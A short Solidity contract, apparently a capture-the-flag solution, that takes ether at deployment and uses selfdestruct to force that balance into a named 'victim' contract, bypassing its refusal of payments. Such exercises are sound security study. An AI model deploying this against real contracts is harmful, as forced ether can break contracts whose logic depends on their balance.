pragma solidity ^0.5.0;

contract HackForce {
    constructor () payable public {
      
    }

    function destruct(address payable victimContractAddress) public {
        selfdestruct(victimContractAddress);
    }
}
